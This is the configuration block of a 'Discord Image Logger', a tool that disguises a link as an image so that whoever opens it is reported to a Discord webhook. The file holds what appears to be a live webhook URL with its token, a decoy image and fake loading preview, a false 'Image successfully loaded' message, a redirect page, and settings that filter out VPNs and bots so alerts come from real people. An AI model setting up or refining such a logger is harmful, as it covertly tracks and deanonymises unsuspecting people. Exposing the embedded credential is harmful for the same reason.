
# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1429721267979948052/IctORonjzN6XAllqxsRQnPn504WU8oBrMNY4H6163THsuKrl_NYFaPCkqy6TzU3Qsa-m",
    "image": "https://media.discordapp.net/attachments/1415293031619498045/1429720973392744449/SSI_20150702184052_O2.png?ex=68f72aea&is=68f5d96a&hm=925fe5dd2c3f5f622d012e6fb732531917527df489513aaba7bc979b8fd6e90c&=&format=webp&quality=lossless", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "message": { # Show a custom message when the user opens the image
        "doMessage": True, # Enable the custom message?
        "message": "Image successfully loaded.", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 2, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 3, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": True, # Redirect to a webpage?
        "page": "https://app-gamma-two-49.vercel.app/" # Link to the webpage to redirect to 
    },

    # BANNER CONFIG #
    "banner": {
        "title": "노무현 네네치킨",
        "description": "Click to view the image",
        "image": "https://app-gamma-two-49.vercel.app"
    }
}

blacklistedIPs = ("27", "104", "143", "164")
